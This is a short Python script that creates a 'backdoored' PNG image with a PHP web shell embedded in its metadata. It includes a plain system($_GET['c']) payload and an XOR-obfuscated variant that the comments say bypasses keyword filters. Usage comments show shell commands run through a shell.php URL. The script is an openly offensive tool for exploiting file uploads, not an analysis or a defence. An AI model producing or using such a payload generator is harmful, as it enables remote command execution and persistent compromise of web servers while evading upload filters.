from PIL import Image

# Shellcodes - Bypass included : Keyword Recognition : System, GET, php
# --- How to use : http://localhost/shell.php?c=echo%20'<pre>';ls

#shellcode  = "<?=@`$_GET[c]`;"
shellcode = "<?php system($_GET['c']); ?>"
# --- How to use : http://localhost/shell.php?_=system&__=echo%20'<pre>';ls
shellcode2 = "<?='Sh3ll'; $_='{';$_=($_^'<').($_^'>;').($_^'/');?><?=${'_'.$_}['_'](${'_'.$_}['__']);?>"


print "\n[+] Advanced Upload - Shell inside metadatas of a PNG file"

# Create a backdoored PNG
print " - Creating a payload.png"
im = Image.new("RGB", (10,10), "Black")
im.info["shell"] = shellcode
reserved = ('interlace', 'gamma', 'dpi', 'transparency', 'aspect')

# undocumented class
from PIL import PngImagePlugin
meta = PngImagePlugin.PngInfo()

# copy metadata into new object
for k,v in im.info.iteritems():
	if k in reserved: continue
	meta.add_text(k, v, 0)
im.save("payload.png", "PNG", pnginfo=meta)

print "Done"